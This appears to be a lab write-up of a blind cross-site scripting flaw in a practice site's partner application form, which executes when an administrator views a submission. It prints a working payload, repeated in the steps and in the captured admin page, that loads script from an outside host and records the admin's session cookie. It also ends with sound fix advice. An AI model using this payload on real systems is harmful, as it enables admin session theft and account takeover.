Lab name : Blind XSS - Partner Ecosystem
# Title
Blind Cross-Site Scripting (XSS) via Partner Application Form Leading to Admin Session

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public partner application form. The application fails to properly sanitize or encode user-supplied input before storing it in the database. When a partner operations manager or administrator logs into the backend admin console and views the submitted application (`/admin/view.php?id=1`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://partnerhub.pwnedbox.site/apply.php` (Injection Point)
- `https://partnerhub.pwnedbox.site/admin/view.php?id=1` (Execution Point)

# Vulnerable Parameter
Based on the DOM analysis, the following parameters are vulnerable and reflect the payload unsanitized in the admin panel:

- `Company name` (Reflected in the `<h1>` tag and the "Company" column in the admin list)
- `Full name` (Reflected in the `<p>` tag below the title)
- `Country / region` (Reflected in the "Country" field)
- `Primary region(s)` (Reflected in the "Regions" field)
- `What do you offer?` (Reflected in the "Capabilities" section)
- `Relevant experience` (Reflected in the "Relevant experience" section)
- `What would you like to achieve together?` (Reflected in the "Partnership goals" section)

# Steps to Reproduce
1. Navigate to the partner application form: `https://partnerhub.pwnedbox.site/apply.php`
2. In the **"Company name"**, **"Full name"**, **"Country / region"**, **"Primary region(s)"**, **"What do you offer?"**, **"Relevant experience"**, and **"What would you like to achieve together?"** fields, insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
3. Fill in the remaining required fields (Company website, Work email, etc.) with valid data and click **"Submit application"**.
4. Wait for the partner operations manager/administrator to log in and view the submitted application in the admin console.
5. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/admin/view.php?id=1`), and the Referrer (`/admin/index.php`), confirming the payload executed in the admin's browser.

# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

# Proof of Concept
<img width="1920" height="1038" alt="1" src="https://github.com/user-attachments/assets/74237c9a-a780-45ac-b55d-23da912bb1eb" />
<img width="1920" height="1039" alt="2" src="https://github.com/user-attachments/assets/9f452324-f731-4ea0-aff0-6f3826066bcf" />
<img width="1920" height="1038" alt="3" src="https://github.com/user-attachments/assets/1a35a7aa-313c-418a-950f-2200200f3f22" />
<img width="1920" height="1039" alt="4" src="https://github.com/user-attachments/assets/d1651809-93ef-4a67-9f51-401b4318ae27" />
<img width="1920" height="1040" alt="5" src="https://github.com/user-attachments/assets/60f706b1-5d68-4cb9-872e-5fda290106f7" />
<img width="1920" height="1039" alt="6" src="https://github.com/user-attachments/assets/30068cef-a052-4936-ba24-b0204461edc3" />


# Extracted DOM
```js
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PH-6031CCF4 · PartnerHub</title>
</head>
<body class="admin">
    <!-- ... header ... -->
    <main class="case">
        <div class="admin-heading">
            <div>
                <span class="kicker">PH-6031CCF4</span>
                <!-- REFLECTION 1: Company name -->
                <h1>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></h1>
                <!-- REFLECTION 2: Full name -->
                <p>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"> · hello@gmail.com</p>
            </div>
            <span class="pill pill-pending">pending</span>
        </div>
        <div class="columns">
            <section class="detail-card">
                <h3>Company profile</h3>
                <dl>
                    <dt>Website</dt><dd>https://partnerhub.pwnedbox.site/apply.php</dd>
                    <!-- REFLECTION 3: Country / region -->
                    <dt>Country</dt><dd>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></dd>
                    <dt>Size</dt><dd>11–50</dd>
                    <dt>Partner type</dt><dd>Agency / consultancy</dd>
                    <!-- REFLECTION 4: Primary region(s) -->
                    <dt>Regions</dt><dd>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></dd>
                </dl>
                <hr>
                <!-- REFLECTION 5: What do you offer? -->
                <h3>Capabilities</h3>
                <p>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></p>
                <!-- REFLECTION 6: Relevant experience -->
                <h3>Relevant experience</h3>
                <p>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></p>
                <!-- REFLECTION 7: What would you like to achieve together? -->
                <h3>Partnership goals</h3>
                <p>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></p>
            </section>
            <!-- ... aside forms ... -->
        </div>
    </main>
    <!-- ... scripts ... -->
</body>
</html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.
